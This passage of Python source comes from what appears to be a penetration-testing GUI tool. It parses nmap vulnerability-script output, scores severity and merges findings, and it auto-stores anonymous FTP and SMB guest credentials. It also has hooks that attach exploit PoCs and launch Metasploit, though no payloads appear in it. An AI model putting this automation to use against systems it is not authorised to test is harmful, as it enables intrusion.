                        f"`username map script` — which is NOT the default. On a stock\n"
                        f"configuration the exploit fails against a vulnerable version.\n\n"
                        f"Confirm before reporting: run the MSF module (it fails cleanly\n"
                        f"if the option is unset), or read smb.conf if you get a shell.\n\n"
                        f"Use the EXPLOIT WITH MSF button to launch the Metasploit module.",
                        severity="high", source="nmap banner",
                        port=smb_p)
            except (ValueError, IndexError):
                pass

    def update_from_vuln_scripts(self, output_lines: list):
        """
        Parse nmap vuln scripts output and add findings to Target Intel.
        Called after NMAP Vuln Scripts completes.

        Nmap NSE vuln output is pipe-prefixed:
          | http-vuln-cve2014-3704:
          |   VULNERABLE:
          |   Drupal - pre Auth SQL Injection Vulnerability
          |     State: VULNERABLE (Exploitable)
          |     IDs:  CVE:CVE-2014-3704
          |       The Drupal core...
          |     References:
          |       https://www.drupal.org/SA-CORE-2014-005
          |_      https://cve.mitre.org/...

        Bug-fix history (2026-04-29):
          • Broadened the script-header regex to catch ANY NSE script
            name (was only `*vuln*` / `ssl-` / `smb-` / `http-` / `cve`).
            That left script names like `sslv2-drown` unrecognised, so
            their ERROR lines bled into the previous script's
            description and produced fake "VULNERABLE" findings.
          • Added an explicit ERROR-sentinel detector — when a script
            prints "ERROR: Script execution failed" we flush the current
            block WITHOUT generating a finding (an error is not a vuln).
          • Title selection now skips ERROR / META lines so a junk
            line never becomes the user-visible finding title.
          • Strict gate: a finding is only produced when at least one
            non-error description line carries a POSITIVE "VULNERABLE"
            token — a "NOT VULNERABLE" verdict does not count.
          • Failed scripts are aggregated into a single optional
            diagnostic info-finding at the end of the parse.
        """
        current_vuln  = None
        current_cve   = None
        current_desc  = []
        current_refs  = []
        failed_scripts = []   # names of scripts that errored (for diag)

        full_text = "\n".join(output_lines)

        def _flush(commit: bool):
            """Emit the in-progress finding (if any) and reset state.
            ``commit=True``  → call _add_vuln_finding when VULNERABLE is
                              actually present in the captured description.
            ``commit=False`` → just discard (used on script ERROR sentinels)."""
            nonlocal current_vuln, current_cve, current_desc, current_refs
            if commit and current_vuln:
                # Build the "evidence" string from non-error description
                # lines only — guards against fake VULNERABLE findings
                # produced by ERROR-line residue.
                clean_for_check = [
                    d for d in current_desc
                    if not self._NSE_ERROR_RE.search(d)
                ]
                # The evidence must be a POSITIVE verdict.  nmap prints
                # "NOT VULNERABLE" for a script that ran and cleared the
                # target (e.g. smtp-vuln-cve2010-4344 against Postfix:
                # "The SMTP server is not Exim: NOT VULNERABLE", or a full
                # "NOT VULNERABLE:" block) — and the bare `"VULNERABLE" in d`
                # substring counts that as a hit, emitting a cleared
                # script as a finding.  Reject lines whose only match is a
                # negated one.
                if any("VULNERABLE" in d
                       and not re.search(r"NOT\s+VULNERABLE", d, re.I)
                       for d in clean_for_check):
                    self._add_vuln_finding(
                        current_vuln, current_cve,
                        clean_for_check, current_refs)
            current_vuln  = None
            current_cve   = None
            current_desc  = []
            current_refs  = []

        for line in output_lines:
            # Skip port listing lines — they are NOT vuln data, but they
            # do mark the end of a script-output block.
            if self._PORT_LINE_RE.match(line):
                _flush(commit=True)
                continue

            # Skip nmap metadata lines (Nmap done, MAC Address, …).
            if self._NMAP_META_RE.match(line.lstrip('|').strip()):
                continue

            # Detect a script header.  The broad regex matches anything
            # that LOOKS like "name:" on its own line; we then check
            # against the meta-tag whitelist to reject State:, IDs:,
            # References: etc. that appear inside a script's body.
            m_hdr = self._NSE_SCRIPT_HEADER_RE.match(line)
            if m_hdr:
                hdr = m_hdr.group(1).strip().lower()
                if hdr not in self._NSE_META_TAGS:
                    # Genuine script-name → flush previous, start new.
                    _flush(commit=True)
                    current_vuln = m_hdr.group(1).strip()
                    continue
                # Else: it's a meta-tag (State:, IDs:, …) — fall through
                # to description handling below.

            # Detect an error sentinel.  An ERROR line marks the END of
            # whatever block we were in — but we still want to COMMIT
            # the previous block if it actually contained VULNERABLE
            # evidence (the gate inside _flush takes care of that).
            #
            # Why commit=True: the ERROR may belong to a SIBLING script
            # whose name didn't match the header regex — discarding the
            # previous block here would also discard a legitimate vuln
            # that finished just before the error line (e.g. smtp-vuln
            # finding wiped because sslv2-drown errored on the next
            # line).  The flush gate filters out scripts with no
            # VULNERABLE evidence, so erroring-only blocks naturally
            # produce no finding.
            err_m = self._NSE_ERROR_RE.search(line)
            if err_m:
                # The error line typically prefixes the failing script
                # name (e.g. "sslv2-drown: ERROR: Script execution
                # failed").  Capture it for the diagnostic summary.
                failed_name_m = re.match(
                    r"^\s*\|?[_\s]*\s*([a-z][a-z0-9][\w-]{2,80}):\s*ERROR:",
                    line, re.IGNORECASE)
                fname = (failed_name_m.group(1).strip()
                         if failed_name_m else current_vuln or "")
                if fname and fname not in failed_scripts:
                    failed_scripts.append(fname)
                _flush(commit=True)
                continue

            # Detect VULNERABLE state — record verbatim.
            if "VULNERABLE" in line and current_vuln:
                current_desc.append(line.strip())
                continue

            # Detect CVE — handles "CVE:CVE-2014-3704" and bare CVE refs.
            if current_vuln:
                for m_cve in re.finditer(r'(CVE-\d{4}-\d+)', line, re.I):
                    current_cve = m_cve.group(1)

            # Collect references (URLs).
            if current_vuln and ("http://" in line or "https://" in line):
                url_m = re.search(r'(https?://\S+)', line)
                if url_m:
                    current_refs.append(url_m.group(1))
                continue

            # Collect description text (skip junk + error sentinels).
            if current_vuln and line.strip():
                clean = line.strip().lstrip("|").lstrip("_").strip()
                if (clean
                        and clean != "|"
                        and not self._PORT_LINE_RE.match(clean)
                        and not self._NMAP_META_RE.match(clean)
                        and not self._NSE_ERROR_RE.search(clean)):
                    current_desc.append(clean)

        # Final flush at end-of-output.
        _flush(commit=True)

        # ── Aggregated diagnostic for failed NSE scripts ──────────────
        # Surfaces transient script failures (timeouts, socket errors,
        # script-execution exceptions) in ONE info-severity finding so
        # the user notices the noise without it polluting the real
        # vulnerability list.  Only fires when at least one script
        # actually errored — otherwise stays silent.
        if failed_scripts:
            uniq = []
            seen = set()
            for n in failed_scripts:
                if n not in seen:
                    seen.add(n)
                    uniq.append(n)
            self.add_auto_finding(
                "NSE scripts that failed during this scan",
                f"Some nmap NSE scripts errored out and produced no "
                f"vulnerability data:\n\n  • " + "\n  • ".join(uniq[:20])
                + (f"\n  • … and {len(uniq) - 20} more" if len(uniq) > 20 else "")
                + "\n\nRun nmap manually with `-d` for the underlying "
                "error message. These failures are NOT vulnerabilities.",
                severity="info", source="nmap vuln scripts (diagnostic)")

        # ── Credential auto-add from NSE scripts ──────────────────────
        # ftp-anon: "Anonymous FTP login allowed"
        target = getattr(self._fp, "target", "") if self._fp else ""
        if not target:
            try:
                target = self.app.session_manager.current.target
            except Exception:
                target = ""

        if re.search(r'Anonymous FTP login allowed', full_text, re.I):
            fp = re.search(r'(\d+)/tcp\s+open\s+ftp', full_text)
            ftp_port = int(fp.group(1)) if fp else 21
            self.add_auto_finding(
                "FTP anonymous login allowed",
                f"{target}:{ftp_port} accepts anonymous FTP login "
                "(detected by nmap ftp-anon script).",
                severity="high", source="nmap scripts",
                port=ftp_port)
            if hasattr(self.app, "cred_store") and target:
                from utils.session import Credential
                self.app.cred_store.add_credential(Credential(
                    username="anonymous", password="anonymous",
                    cred_type="cleartext", services=["FTP"],
                    source_phase="scanning", host=target,
                    notes=f"FTP anon login (nmap ftp-anon) on {target}:{ftp_port}",
                    # ftp-anon reports "login allowed" only after the
                    # script logged in anonymously.
                    verified=True))

        # Version/banner-based CVE detectors (vsftpd, distcc, UnrealIRCd,
        # Samba) used to live here.  They key off nmap `-sV` version
        # banners whose output is delivered to `update_from_nmap`, NOT to
        # this method — so a plain service scan never reached them and
        # Samba CVE-2007-2447 / distcc CVE-2004-2687 were silently lost
        # (live-validation F-07 / F-08).  They now live in
        # `_detect_version_cves`, invoked from `update_from_nmap` (which
        # runs for every nmap scan, including the vuln-script one), so the
        # detectors are reachable from the flow that actually carries the
        # version data.

        # smb-security-mode: "account_used: guest" → anonymous SMB
        if re.search(r'account_used:\s*guest', full_text, re.I):
            sp = re.search(r'(\d+)/tcp\s+open\s+(?:microsoft-ds|netbios-ssn)',
                           full_text)
            smb_port = int(sp.group(1)) if sp else 445
            self.add_auto_finding(
                "SMB guest/anonymous access detected",
                f"{target}:{smb_port} — nmap used a guest account "
                "(anonymous SMB session possible).",
                severity="high", source="nmap scripts",
                port=smb_port)
            if hasattr(self.app, "cred_store") and target:
                from utils.session import Credential
                self.app.cred_store.add_credential(Credential(
                    username="guest", password="",
                    cred_type="cleartext", services=["SMB"],
                    source_phase="scanning", host=target,
                    notes=f"SMB guest session (nmap) on {target}:{smb_port}",
                    # "account_used: guest" means nmap's SMB session
                    # was established with the guest account.
                    verified=True))

    def _add_vuln_finding(self, vuln_name: str, cve: str,
                          desc_lines: list, refs: list = None):
        """Add a confirmed vulnerability to Target Intel.

        Builds a structured, readable description with:
          - Human-friendly CVE name (if known)
          - Script name + clean description lines
          - References section with URLs
        """
        # Clean description lines — keep them as separate lines for
        # readability instead of mashing into one blob
        clean_lines = []
        seen = set()
        for raw in desc_lines:
            l = raw.strip().lstrip("|").lstrip("_").strip()
            if not l:
                continue
            # Skip duplicates, VULNERABLE markers, State: lines
            if l in seen:
                continue
            if "VULNERABLE" in l and "State:" not in l:
                continue
            if l.startswith("State:"):
                continue
            if l.startswith("IDs:"):
                continue
            # Skip script-error sentinels — they are diagnostic noise,
            # not part of a real vulnerability description.  Without
            # this guard a "<script>: ERROR: Script execution failed"
            # line that bled in from a sibling script would become the
            # finding TITLE (the bug user reported on 2026-04-29).
            if self._NSE_ERROR_RE.search(l):
                continue
            seen.add(l)
            clean_lines.append(l)

        # Build a meaningful title — first description line that looks
        # like real prose (not a meta-tag, not an error, not a URL).
        human_name = self._CVE_NAMES.get(cve, "") if cve else ""
        if not human_name and clean_lines:
            for first in clean_lines:
                # Reject obvious junk before accepting as title
                if len(first) < 10:
                    continue
                if first.startswith("http"):
                    continue
                if "References:" in first:
                    continue
                if "Disclosure date:" in first:
                    continue
                if self._NSE_ERROR_RE.search(first):
                    continue
                # Reject lines that are basically meta-tag echoes:
                # "Risk factor: High", "Extra information: …"
                low = first.lower()
                if any(low.startswith(t + ":")
                       for t in ("risk factor", "extra information",
                                  "check_results", "exploit_results")):
                    continue
                human_name = first[:80]
                break

        if cve and human_name:
            title = f"{cve}  —  {human_name}"
        elif cve:
            title = f"{cve}  —  {vuln_name}"
        else:
            title = human_name or vuln_name

        # Build structured description
        parts = []
        parts.append(f"Script: {vuln_name}")
        if cve:
            parts.append(f"CVE:    {cve}")
        parts.append("")

        # The actual description text (first meaningful lines)
        for line in clean_lines[:8]:
            parts.append(f"  {line}")

        # References
        if refs:
            parts.append("")
            parts.append("References:")
            for url in refs[:4]:
                parts.append(f"  {url}")

        desc = "\n".join(parts)

        # Severity: derived (NOT guessed from a naive substring scan).
        # See _classify_vuln_severity for the priority chain.
        severity = self._classify_vuln_severity(vuln_name, cve, clean_lines)

        self.add_auto_finding(
            title=title,
            description=desc,
            severity=severity,
            source="nmap vuln scripts")

    def _classify_vuln_severity(self, vuln_name: str, cve: str,
                                clean_lines: list) -> str:
        """Derive the severity of a confirmed nmap vuln-script finding.

        Priority order — all OFFLINE, the parsing path never blocks on
        the network:
          1. In-house CVE knowledge base (utils.cve_knowledge).
          2. Curated per-CVE table   (_VULN_CVE_SEVERITY).
          3. Curated per-script table (_VULN_SCRIPT_SEVERITY).
          4. Category keyword heuristic, WORD-BOUNDARY safe.

        Step 4 fixes the historic bug where the bare substring "rce"
        matched "resou**rce**s" / "fo**rce**", inflating a DoS or a
        crypto-downgrade MitM to "critical" while a real RCE backdoor
        stayed "high".  Returns one of info/low/medium/high/critical.
        """
        # 1 — in-house KB (offline exact-CVE lookup).
        if cve:
            try:
                from utils import cve_knowledge as _kb
                kb_sev = _kb.severity_for_cve(cve)
            except Exception:
                kb_sev = None
            if kb_sev:
                return kb_sev
            # 2 — curated per-CVE table.
            sev = self._VULN_CVE_SEVERITY.get(cve.strip().upper())
            if sev:
                return sev

        # 3 — curated per-script table (no clean/known CVE).
        name_l = (vuln_name or "").lower()
        for needle, sev in self._VULN_SCRIPT_SEVERITY:
            if needle in name_l:
                return sev

        # 4 — category keyword heuristic over name + description.
        blob = name_l + " " + " ".join(clean_lines).lower()
        # RCE / full-compromise family → critical.  \b guards stop
        # "rce" matching inside "resource"/"force"/"commerce".
        if re.search(r"\b(remote code execution|arbitrary code|"
                     r"arbitrary command|command execution|code execution|"
                     r"backdoor|buffer overflow|use[- ]after[- ]free|"
                     r"deserializ\w*|rce)\b", blob):
            return "critical"
        # DoS family → high (availability hit, not a C/I break).
        if re.search(r"\b(denial of service|dos attack|slowloris)\b", blob):
            return "high"
        # Weak-crypto downgrade / MitM family → medium.
        if re.search(r"\b(downgrade|padding oracle|"
                     r"man[- ]in[- ]the[- ]middle|export[- ]grade|"
                     r"weak (?:cipher|key|dh|diffie)|"
                     r"poodle|logjam|freak|drown|sweet32|beast)\b", blob):
            return "medium"

        # Default: a confirmed VULNERABLE finding with no stronger signal.
        return "high"

    def notify_ping_failed(self, target: str):
        self._show_pn_popup(target)

    def add_exploit_results(self, exploits: list):
        self._exploits       = exploits
        self._search_running = False
        self._search_btn.configure(text="SEARCH EXPLOITS", state="normal")
        relevant = [e for e in exploits if e.relevant]
        inactive = [e for e in exploits
                    if not e.relevant and
                    e.exploit_type in ("browser","fileformat","local","dos")]
        self._spinner_stop(
            f"Found {len(exploits)} exploits — {len(relevant)} relevant, "
            f"{len(inactive)} non-applicable hidden")
        self._render_all()
        self.app.terminal.write(
            f"  [+] {len(relevant)} exploits match open ports.", "success")
        self._blink_start()

    @staticmethod
    def _strip_ansi(text: str) -> str:
        """Remove ANSI escape codes from text."""
        import re
        ansi = re.compile(r'\[[0-9;]*[mGKHF]|\[[0-9;]*[A-Za-z]|\[[0-9;]*m')
        return ansi.sub('', text)

    @staticmethod
    def _normalize_finding_port(port) -> "int | None":
        """Coerce an optional port hint to an int in 1..65535, else None.

        Used on BOTH sides of the auto-finding merge key: on the
        caller's `port` argument and on the port read back off an
        already-stored finding (session-restored findings come straight
        from JSON), so the two are always compared in the same domain.
        """
        if isinstance(port, int) and 1 <= port <= 65535:
            return port
        if isinstance(port, str) and port.isdigit():
            try:
                _p = int(port)
            except ValueError:
                return None
            if 1 <= _p <= 65535:
                return _p
        return None

    def _make_finding_occurrence(self, run_no: int, source: str,
                                 linked_run_id: str,
                                 description: str) -> dict:
        """Build a small run-history entry for an auto finding."""
        return {
            "n": run_no,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "source": source or "",
            "linked_run_id": linked_run_id or "",
            "description": description or "",
        }

    def _ensure_finding_occurrences(self, finding: dict) -> list:
        """Return a normalized occurrence list for old and new findings."""
        occs = finding.get("occurrences")
        if not isinstance(occs, list) or not occs:
            try:
                stored_count = int(finding.get("run_count") or 1)
            except (TypeError, ValueError):
                stored_count = 1
            stored_count = max(stored_count, 1)
            base_ts = (finding.get("first_seen") or
                       finding.get("last_seen") or "")
            occs = []
            for idx in range(1, stored_count + 1):
                occs.append({
                    "n": idx,
                    "timestamp": base_ts,
                    "source": finding.get("source", "") or "",
                    "linked_run_id": (
                        finding.get("linked_run_id", "") or ""),
                    "description": finding.get("description", "") or "",
                })
            finding["occurrences"] = occs

        normalized = []
        for idx, occ in enumerate(occs, 1):
            if not isinstance(occ, dict):
                occ = {"description": str(occ)}
            occ["n"] = idx
            occ.setdefault("timestamp", "")
            occ.setdefault("source", finding.get("source", "") or "")
            occ.setdefault("linked_run_id",
                           finding.get("linked_run_id", "") or "")
            occ.setdefault("description",
                           finding.get("description", "") or "")
            normalized.append(occ)

        finding["occurrences"] = normalized
        finding["run_count"] = len(normalized)
        if normalized:
            finding.setdefault("first_seen",
                               normalized[0].get("timestamp", ""))
            finding["last_seen"] = normalized[-1].get("timestamp", "")
        return normalized

    def _format_finding_runs(self, finding: dict) -> str:
        """Run-counter badge — empty for the first run, just the
        latest count for subsequent runs.

        UX rationale: the user reads "GOBUSTER — 3 paths" titles as if
        the "3" were a run counter (it's not, it's the discovered-paths
        count baked into the title).  By stripping the count from
        titles AND showing the run counter ONLY when ≥ 2, the meaning
        becomes unambiguous:

          • First run  →  GOBUSTER on http://target/
          • Second run →  GOBUSTER on http://target/   2
          • Third run  →  GOBUSTER on http://target/   3
        """
        occs = self._ensure_finding_occurrences(finding)
        n = len(occs)
        if n <= 1:
            return ""
        return str(n)

    def remove_auto_findings_by_source(self, source: str) -> int:
        """Drop every auto-finding emitted by ``source`` (case-insensitive).

        Snapshot enumerators (enum4linux / rpcclient) call this right
        before writing their fresh finding so a re-run leaves exactly ONE
        card for the tool instead of stacking a new one beside the
        previous run's — including a stale card left by an earlier HAWK
        version whose title carried a now-changed count.  Returns the
        number removed.  Main-thread only (callers wrap it in ui_call /
        ``after``); it mutates the finding list and re-renders.
        """
        src = (source or "").strip().lower()
        if not src:
            return 0
        keep, removed = [], 0
        for f in self._auto_findings:
            if (f.get("source") or "").strip().lower() == src:
                removed += 1
            else:
                keep.append(f)
        if removed:
            self._auto_findings = keep
            try:
                self._render_auto_findings()
            except Exception:
                pass
            _rb = getattr(self, "_refresh_new_badge", None)
            if _rb:
                _rb()
        return removed

    def _render_and_blink(self, count_as_new: bool = True):
        """Re-render the findings panel + refresh the badge — UNLESS a
        batch push is in progress (see _suspend_finding_render).

        Every add_auto_finding path routes its render through here so a
        caller pushing several findings at once (e.g. JWT Analyzer's
        finalize) pays for ONE panel rebuild instead of N.  N full
        rebuilds in a single main-thread burst froze the app for several
        seconds on a large panel (the JWT "can't click for ~5s" report).
        """
        if getattr(self, "_render_suspended", False):
            return
        self._render_auto_findings()
        self._blink_start(count_as_new=count_as_new)

    def _suspend_finding_render(self):
        """Start a batch: per-finding renders are held until resume."""
        self._render_suspended = True

    def _resume_finding_render(self):
        """End a batch and do the single deferred render + badge refresh."""
        self._render_suspended = False
        self._render_and_blink(count_as_new=True)

    def add_auto_finding(self, title: str, description: str,
                         severity: str = "info", source: str = "",
                         linked_run_id: str = "",
                         port: "int | None" = None,
                         raw_description: str = "",
                         replace: bool = False):
        """Add or UPDATE an auto-finding in Target Intel.

        If a finding with the same title AND the same port already
        exists (e.g. user runs gobuster a second time with a different
        wordlist), we MERGE the new description lines into the existing
        one and records every run, including identical reruns.  The
        finding is marked as recently modified so
        `_render_auto_findings_section` can draw it with a bright
        border until the user reads it.

        The port is part of the merge key on purpose: the same title on
        two different ports describes two different facts and must stay
        two findings (see the comment on the merge loop below).

        ``linked_run_id`` ties this finding to credentials pushed by the
        same tool parser — see _run_id_new() for the convention and
        _render_auto_findings_section for the "🔑 creds (N)" button
        that surfaces the linkage in the UI.

        ``port`` is an OPTIONAL authoritative TCP port hint set by
        parsers that already know it (nmap port scan, banner detection,
        connect-output parsers).  When set, it bypasses the textual
        regex extraction in ``_extract_port_from_finding`` and feeds
        the MSF launch dialog's RPORT pre-fill directly.

        ``raw_description`` is OPTIONAL un-masked counterpart of
        ``description`` for parsers that mask secrets in the public
        description.  Stored on the finding under the in-memory key
        ``_raw_description`` (underscore-prefixed → stripped at
        session-save time, never written to disk).  The Info dialog's
        SHOW RAW toggle uses it to swap the EVIDENCE block locally.

        ``replace`` makes a merge OVERWRITE the existing description and
        severity with this call's values instead of appending — for
        snapshot tools (gobuster/dirb/ffuf) whose every run reports the
        complete current state, so appending stacked contradictory
        summaries ("0 paths found" next to "Discovered 22 paths").  The
        per-run ``occurrences`` history is kept either way.

        Thread-safe by construction: pushing a finding rerenders Tk
        widgets, so a call arriving from a worker thread (tool job,
        xterm watcher) is re-dispatched to the UI thread and returns.
        """
        if threading.current_thread() is not threading.main_thread():
            ui = getattr(getattr(self, "app", None), "ui_call", None)
            if ui:
                ui(self.add_auto_finding, title, description,
                   severity=severity, source=source,
                   linked_run_id=linked_run_id, port=port,
                   raw_description=raw_description, replace=replace)
                return

        from utils.session import Finding

        sev_rank = {"critical": 0, "high": 1, "medium": 2,
                    "low": 3, "info": 4}

        # Strip ANSI codes
        title       = self._strip_ansi(title).strip()
        severity    = Finding.normalize_severity(severity)
        description = self._strip_ansi(description).strip()
        source      = self._strip_ansi(source or "").strip()
        linked_run_id = (linked_run_id or "").strip()
        raw_description = (self._strip_ansi(raw_description or "")
                           .strip())

        # Normalise the optional port hint
        port_int = self._normalize_finding_port(port)

        # Merge path: title already exists -> append new lines and keep
        # a per-run history for repeated scans.
        try:
            self._collapsed["vulns"] = False
        except Exception:
            pass

        for existing in self._auto_findings:
            # Merge key is (title, port), NOT title alone.  Two findings
            # that share a title but sit on different ports are two
            # distinct facts about the target — "Directory listing
            # enabled" on 80 and on 8080 are two cards and two report
            # rows, not one.  Collapsing them lost data all the way
            # into the client deliverable.
            # The documented merge case is unaffected: re-running the
            # same tool against the same port yields the same `port`,
            # and a parser that supplies no port keeps merging on
            # (title, None) exactly as before.
            if (existing["title"].lower() == title.lower()
                    and self._normalize_finding_port(
                        existing.get("port")) == port_int):
                occs = self._ensure_finding_occurrences(existing)
                run_no = len(occs) + 1
                occs.append(self._make_finding_occurrence(
                    run_no, source or existing.get("source", ""),
                    linked_run_id, description))
                existing["occurrences"] = occs
                existing["run_count"] = len(occs)
                existing["last_seen"] = occs[-1].get("timestamp", "")
                # Refresh in-memory raw description if the new caller
                # supplied one.  When the new caller passes an empty
                # `raw_description` we PRESERVE the previous one — the
                # operator may already have toggled SHOW RAW, and a
                # caller that simply didn't compute a raw this run
                # (e.g. a different parser merging into the same
                # title) shouldn't blank out the previous raw.
                if raw_description:
                    existing["_raw_description"] = raw_description

                if replace:
                    # Snapshot tools (gobuster/dirb/ffuf) report the
                    # CURRENT complete state each run, so the new
                    # description SUPERSEDES the old instead of being
                    # appended — appending stacked contradictory cards
                    # ("0 paths found" next to "Discovered 22 paths").
                    # The occurrences recorded above keep the per-run
                    # history; the visible description + severity track
                    # the latest run.
                    existing["description"] = description
                    existing["severity"] = severity
                    if source:
                        existing["source"] = source
                    if linked_run_id:
                        existing["linked_run_id"] = linked_run_id
                    existing["_fresh"] = True
                    existing["_update_note"] = f"REFRESHED #{run_no}"
                    self._render_and_blink(count_as_new=True)
                    self.app.terminal.write(
                        f"  [+] Target Intel refreshed: {title}  "
                        f"(run #{run_no})", "success")
                    try:
                        self._kb_correlate(
                            title, description,
                            port=existing.get("port"), source=source)
                    except Exception as e:
                        import sys as _s
                        print(f"[HAWK] CVE KB correlation (replace) "
                              f"failed: {e}", file=_s.stderr)
                    return

                old_lines = existing.get("description", "").splitlines()
                new_lines = description.splitlines()
                seen = {ln.strip() for ln in old_lines if ln.strip()}
                added = 0
                merged = list(old_lines)
                for ln in new_lines:
                    key = ln.strip()
                    if not key or key in seen:
                        continue
                    merged.append(ln)
                    seen.add(key)
                    added += 1
                if added:
                    # New evidence lines are merged into the same card.
                    existing["description"] = "\n".join(merged).rstrip()
                # Escalate severity if the new run is worse
                new_rank = sev_rank.get(severity.lower(), 4)
                old_rank = sev_rank.get(
                    (existing.get("severity") or "info").lower(), 4)
                if new_rank < old_rank:
                    existing["severity"] = severity
                if source and not existing.get("source"):
                    existing["source"] = source
                # Replace the linked_run_id with the new one — a merge
                # means the user just re-ran the same tool, so the
                # latest run's cred batch is the one worth navigating
                # to.  Empty new id doesn't clobber a pre-existing one.
                if linked_run_id:
                    existing["linked_run_id"] = linked_run_id
                # No port bookkeeping here: the port is part of the
                # merge key above, so a match already means the two
                # findings agree on it.
                # Re-highlight the card on EVERY re-run (cyan, until the
                # user reads it) — even when the evidence is identical.
                # Previously a same-evidence re-run left `_fresh` untouched,
                # so re-running a tool on a finding the user had already
                # read gave NO visual feedback (looked like nothing
                # happened).  The "(N new)" badge mirrors the number of
                # fresh rows (_refresh_new_badge), so re-flagging one row
                # can never make the badge drift from the glow.
                existing["_fresh"] = True
                existing["_update_note"] = (
                    f"UPDATED #{run_no}" if added else f"RE-RUN #{run_no}")
                self._render_and_blink(count_as_new=bool(added))
                if added:
                    self.app.terminal.write(
                        f"  [+] Target Intel updated: {title}  "
                        f"(run #{run_no}, +{added} new "
                        f"entr{'y' if added == 1 else 'ies'})",
                        "success")
                else:
                    self.app.terminal.write(
                        f"  [+] Target Intel seen again: {title}  "
                        f"(run #{run_no}, same evidence)",
                        "success")
                # Re-run the KB hook on the merged description — a
                # second push may carry version info that the first
                # didn't, and gated entries (version_match set) only
                # fire once that signal lands.  The source-prefix
                # guard inside _kb_correlate stops re-entry on the
                # KB's own emissions.
                if added:
                    try:
                        self._kb_correlate(
                            title, existing.get("description", ""),
                            port=existing.get("port"),
                            source=source)
                    except Exception as e:
                        import sys as _s
                        print(f"[HAWK] CVE KB correlation (merge) "
                              f"failed: {e}", file=_s.stderr)
                return

        # Brand-new finding — canonical core built through the unified
        # Finding model (utils.session), merge bookkeeping layered on.
        occ = self._make_finding_occurrence(1, source,
                                            linked_run_id, description)
        new_finding = Finding(
            severity=severity, title=title, source=source,
            description=description, linked_run_id=linked_run_id,
            port=port_int).to_auto_dict()
        new_finding.update({
            "occurrences":    [occ],
            "run_count":      1,
            "first_seen":     occ["timestamp"],
            "last_seen":      occ["timestamp"],
            "_fresh":         True,
            "_update_note":   "NEW #1",
        })
        if raw_description:
            # Underscore prefix → in-memory only; see
            # _FINDING_NON_PERSISTED_KEYS in target_bar.py.
            new_finding["_raw_description"] = raw_description
        self._auto_findings.append(new_finding)
        self._render_and_blink()
        self.app.terminal.write(
            f"  [+] Finding added to Target Intel: {title}  (run #1)",
            "success")

        # CVE Knowledge Base correlation hook.  When a parser pushes a
        # finding whose title/description matches a known product
        # signature, emit a *correlated* CRITICAL finding right away
        # with the full PoC.  This is the layer that closes the
        # "operator missed the CVE" gap.  The recursion is bounded by
        # the source-prefix guard below: KB-emitted findings won't
        # re-trigger the hook on themselves.
        try:
            self._kb_correlate(title, description, port=port_int,
                                source=source)
        except Exception as e:
            import sys as _s
            print(f"[HAWK] CVE KB correlation failed: {e}", file=_s.stderr)

        # AI-OPS Playbook correlation hook.  Same shape as the CVE KB
        # one, but matches AGAINST a curated registry of self-hosted
        # AI / LLM platforms (Flowise, LangFlow, Dify, n8n, Open
        # WebUI, Ollama, MLflow, MCP Inspector, …).  Pushes a
        # CRITICAL "AI Ops Target — <tool>" finding with the full
        # playbook (CVEs, default creds, auth-bypass probes, RCE
        # vector, ready-to-run PoC).
        try:
            self._aiops_correlate(title, description, port=port_int,
                                   source=source)
        except Exception as e:
            import sys as _s
            print(f"[HAWK] AI-OPS correlation failed: {e}",
                  file=_s.stderr)

    def add_auto_findings(self, findings: list):
        """Batch wrapper around add_auto_finding for parsers that
        produce a list of finding dicts (post-RCE recon, winpeas /
        linpeas batches — see utils/post_rce_recon*.py for the dict
        shape).  Each entry goes through the same merge / dedup /
        severity-escalation path as a single push."""
        for f in findings or []:
            if not isinstance(f, dict) or not f.get("title"):
                continue
            try:
                self.add_auto_finding(
                    title=f.get("title", ""),
                    description=f.get("description", ""),
                    severity=f.get("severity", "info"),
                    source=f.get("source", ""),
                    linked_run_id=f.get("linked_run_id", ""),
                    port=f.get("port"),
                )
            except Exception as e:
                import sys as _s
                print(f"[HAWK] add_auto_findings: skipped "
                      f"'{f.get('title', '')}': {e}", file=_s.stderr)

    # ─── CVE knowledge-base correlation ────────────────────────────────────

    _KB_SOURCE_PREFIX = "HAWK CVE KB"

    def _kb_correlate(self, title: str, description: str,
                       port: "int | None" = None,
                       source: str = "") -> None:
        """Look up `(title, description)` against the KB.  For each hit,
        push a correlated finding with the resolved PoC.  Source-prefix
        guard prevents the hook from re-entering on its own emissions.
        """
        if (source or "").startswith(self._KB_SOURCE_PREFIX):
            return
        from utils import cve_knowledge as _kb
        hits = _kb.match_finding(title, description)
        if not hits:
            return

        # Resolve placeholders.  PRIORITY ORDER for the {target} +
        # {scheme} substitution — pick the most specific source so a
        # vhost-scoped finding (e.g. Oracle on mcp.kobold.htb)
        # produces a PoC against THAT vhost, not the apex domain:
        #
        #   1. URL parsed from the originating finding's title /
        #      description — the source-of-truth for vhost-scoped
        #      findings.
        #   2. session.target_domain (apex) as fallback.
        #   3. session.target_ip / fingerprint target as last resort.
        import re as _re
        from urllib.parse import urlparse as _urlparse
        target = ""
        scheme = ""
        url_m = _re.search(
            r"(https?://[A-Za-z0-9._\-]+(?::\d+)?)",
            f"{title}\n{description}")
        if url_m:
            try:
                pu = _urlparse(url_m.group(1))
                if pu.hostname:
                    target = pu.hostname
                    scheme = pu.scheme or scheme
                    if pu.port and not port:
                        port = pu.port
            except Exception:
                pass
        if not target:
            try:
                sess = self.app.session_manager.current
                if sess:
                    target = (getattr(sess, "target_domain", "")
                              or getattr(sess, "target_ip", "") or "").strip()
            except Exception:
                pass
        if not target and self._fp:
            try:
                target = (getattr(self._fp, "target", "")
                          or getattr(self._fp, "ip", "")) or ""
            except Exception:
                pass
        # Scheme: extracted URL wins; fall back to a heuristic on the
        # finding text and the port hint.
        if not scheme:
            scheme = "http"
            blob_low = (title + " " + description).lower()
            if "https" in blob_low or "ssl/http" in blob_low or \
               (port and int(port) in (443, 8443)):
                scheme = "https"
        port_for_pp = port or ""

        for entry in hits:
            entry_id = entry.get("id", "?")
            kb_title = f"▶ {entry_id}  ·  {entry.get('title', '')}"
            kb_desc = _kb.render_correlated_description(
                entry, scheme=scheme, target=target or "TARGET",
                port=port_for_pp)
            severity = entry.get("severity", "high")
            # CISA KEV enrichment — when the KB entry's id is on the
            # Known Exploited Vulnerabilities catalog, the CVE is actively
            # exploited in the wild: badge the title, prepend a banner to
            # the description, and force CRITICAL (a KEV finding outranks
            # the KB's own severity guess).  Offline lookup, non-fatal.
            kev = None
            try:
                from utils.cisa_kev import is_kev as _is_kev
                kev = _is_kev(entry_id)
            except Exception:
                kev = None
